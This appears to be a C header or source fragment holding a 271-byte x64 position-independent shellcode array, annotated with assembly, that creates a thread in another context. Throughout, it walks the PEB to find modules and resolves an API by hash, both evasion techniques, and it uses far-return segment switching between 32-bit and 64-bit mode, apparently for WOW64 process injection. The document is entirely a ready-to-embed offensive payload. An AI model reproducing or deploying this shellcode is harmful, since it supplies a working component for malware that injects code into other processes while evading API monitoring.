
#define CREATETHREADPIC_SIZE 271

char CREATETHREADPIC[] = {
  /* 0000 */ "\x53"                             /* push rbx                    */
  /* 0001 */ "\x56"                             /* push rsi                    */
  /* 0002 */ "\x57"                             /* push rdi                    */
  /* 0003 */ "\x55"                             /* push rbp                    */
  /* 0004 */ "\xe8\x6c\x00\x00\x00"             /* call 0x75                   */
  /* 0009 */ "\x85\xc0"                         /* test eax, eax               */
  /* 000B */ "\x74\x5d"                         /* jz 0x6a                     */
  /* 000D */ "\x48\x89\xe6"                     /* mov rsi, rsp                */
  /* 0010 */ "\x48\x83\xe4\xf0"                 /* and rsp, 0xfffffffffffffff0 */
  /* 0014 */ "\x48\x83\xec\x68"                 /* sub rsp, 0x68               */
  /* 0018 */ "\xb8\xfa\x80\x39\x5e"             /* mov eax, 0x5e3980fa         */
  /* 001D */ "\xe8\x78\x00\x00\x00"             /* call 0x9a                   */
  /* 0022 */ "\x48\x89\xc3"                     /* mov rbx, rax                */
  /* 0025 */ "\x4d\x31\xc0"                     /* xor r8, r8                  */
  /* 0028 */ "\x48\x31\xc0"                     /* xor rax, rax                */
  /* 002B */ "\x48\x89\x44\x24\x50"             /* mov [rsp+0x50], rax         */
  /* 0030 */ "\x48\x89\x44\x24\x48"             /* mov [rsp+0x48], rax         */
  /* 0035 */ "\x48\x89\x44\x24\x40"             /* mov [rsp+0x40], rax         */
  /* 003A */ "\x48\x89\x44\x24\x38"             /* mov [rsp+0x38], rax         */
  /* 003F */ "\x48\x89\x44\x24\x30"             /* mov [rsp+0x30], rax         */
  /* 0044 */ "\x8b\x46\x24"                     /* mov eax, [rsi+0x24]         */
  /* 0047 */ "\x48\x89\x44\x24\x28"             /* mov [rsp+0x28], rax         */
  /* 004C */ "\x8b\x46\x20"                     /* mov eax, [rsi+0x20]         */
  /* 004F */ "\x48\x89\x44\x24\x20"             /* mov [rsp+0x20], rax         */
  /* 0054 */ "\x44\x8b\x4e\x14"                 /* mov r9d, [rsi+0x14]         */
  /* 0058 */ "\xba\x00\x00\x00\x10"             /* mov edx, 0x10000000         */
  /* 005D */ "\x8b\x4e\x30"                     /* mov ecx, [rsi+0x30]         */
  /* 0060 */ "\xff\xd3"                         /* call rbx                    */
  /* 0062 */ "\x48\x89\xf4"                     /* mov rsp, rsi                */
  /* 0065 */ "\xe8\x18\x00\x00\x00"             /* call 0x82                   */
  /* 006A */ "\x5d"                             /* pop rbp                     */
  /* 006B */ "\x5f"                             /* pop rdi                     */
  /* 006C */ "\x5e"                             /* pop rsi                     */
  /* 006D */ "\x5b"                             /* pop rbx                     */
  /* 006E */ "\xc3"                             /* ret                         */
  /* 006F */ "\x31\xc0"                         /* xor eax, eax                */
  /* 0071 */ "\x48\xf7\xd8"                     /* neg rax                     */
  /* 0074 */ "\xc3"                             /* ret                         */
  /* 0075 */ "\xe8\xf5\xff\xff\xff"             /* call 0x6f                   */
  /* 007A */ "\x74\x05"                         /* jz 0x81                     */
  /* 007C */ "\x58"                             /* pop rax                     */
  /* 007D */ "\x6a\x33"                         /* push 0x33                   */
  /* 007F */ "\x50"                             /* push rax                    */
  /* 0080 */ "\xcb"                             /* retf                        */
  /* 0081 */ "\xc3"                             /* ret                         */
  /* 0082 */ "\xe8\xe8\xff\xff\xff"             /* call 0x6f                   */
  /* 0087 */ "\x75\x10"                         /* jnz 0x99                    */
  /* 0089 */ "\x58"                             /* pop rax                     */
  /* 008A */ "\x83\xec\x08"                     /* sub esp, 0x8                */
  /* 008D */ "\x89\x04\x24"                     /* mov [rsp], eax              */
  /* 0090 */ "\xc7\x44\x24\x04\x23\x00\x00\x00" /* mov dword [rsp+0x4], 0x23   */
  /* 0098 */ "\xcb"                             /* retf                        */
  /* 0099 */ "\xc3"                             /* ret                         */
  /* 009A */ "\x56"                             /* push rsi                    */
  /* 009B */ "\x57"                             /* push rdi                    */
  /* 009C */ "\x53"                             /* push rbx                    */
  /* 009D */ "\x51"                             /* push rcx                    */
  /* 009E */ "\x49\x89\xc0"                     /* mov r8, rax                 */
  /* 00A1 */ "\x6a\x60"                         /* push 0x60                   */
  /* 00A3 */ "\x5e"                             /* pop rsi                     */
  /* 00A4 */ "\x65\x48\x8b\x06"                 /* mov rax, [gs:rsi]           */
  /* 00A8 */ "\x48\x8b\x40\x18"                 /* mov rax, [rax+0x18]         */
  /* 00AC */ "\x4c\x8b\x50\x30"                 /* mov r10, [rax+0x30]         */
  /* 00B0 */ "\x49\x8b\x6a\x10"                 /* mov rbp, [r10+0x10]         */
  /* 00B4 */ "\x48\x85\xed"                     /* test rbp, rbp               */
  /* 00B7 */ "\x89\xe8"                         /* mov eax, ebp                */
  /* 00B9 */ "\x74\x4f"                         /* jz 0x10a                    */
  /* 00BB */ "\x4d\x8b\x12"                     /* mov r10, [r10]              */
  /* 00BE */ "\x8b\x45\x3c"                     /* mov eax, [rbp+0x3c]         */
  /* 00C1 */ "\x83\xc0\x10"                     /* add eax, 0x10               */
  /* 00C4 */ "\x8b\x44\x05\x78"                 /* mov eax, [rbp+rax+0x78]     */
  /* 00C8 */ "\x48\x8d\x74\x05\x18"             /* lea rsi, [rbp+rax+0x18]     */
  /* 00CD */ "\xad"                             /* lodsd                       */
  /* 00CE */ "\x91"                             /* xchg ecx, eax               */
  /* 00CF */ "\x67\xe3\xde"                     /* jecxz 0xb0                  */
  /* 00D2 */ "\xad"                             /* lodsd                       */
  /* 00D3 */ "\x4c\x8d\x5c\x05\x00"             /* lea r11, [rbp+rax]          */
  /* 00D8 */ "\xad"                             /* lodsd                       */
  /* 00D9 */ "\x48\x8d\x7c\x05\x00"             /* lea rdi, [rbp+rax]          */
  /* 00DE */ "\xad"                             /* lodsd                       */
  /* 00DF */ "\x48\x8d\x5c\x05\x00"             /* lea rbx, [rbp+rax]          */
  /* 00E4 */ "\x8b\x74\x8f\xfc"                 /* mov esi, [rdi+rcx*4-0x4]    */
  /* 00E8 */ "\x48\x01\xee"                     /* add rsi, rbp                */
  /* 00EB */ "\x31\xc0"                         /* xor eax, eax                */
  /* 00ED */ "\x99"                             /* cdq                         */
  /* 00EE */ "\xac"                             /* lodsb                       */
  /* 00EF */ "\x01\xc2"                         /* add edx, eax                */
  /* 00F1 */ "\xc1\xc2\x05"                     /* rol edx, 0x5                */
  /* 00F4 */ "\xff\xc8"                         /* dec eax                     */
  /* 00F6 */ "\x79\xf6"                         /* jns 0xee                    */
  /* 00F8 */ "\x44\x39\xc2"                     /* cmp edx, r8d                */
  /* 00FB */ "\xe0\xe7"                         /* loopne 0xe4                 */
  /* 00FD */ "\x75\xb1"                         /* jnz 0xb0                    */
  /* 00FF */ "\x0f\xb7\x14\x4b"                 /* movzx edx, word [rbx+rcx*2] */
  /* 0103 */ "\x41\x8b\x04\x93"                 /* mov eax, [r11+rdx*4]        */
  /* 0107 */ "\x48\x01\xe8"                     /* add rax, rbp                */
  /* 010A */ "\x59"                             /* pop rcx                     */
  /* 010B */ "\x5b"                             /* pop rbx                     */
  /* 010C */ "\x5f"                             /* pop rdi                     */
  /* 010D */ "\x5e"                             /* pop rsi                     */
  /* 010E */ "\xc3"                             /* ret                         */
};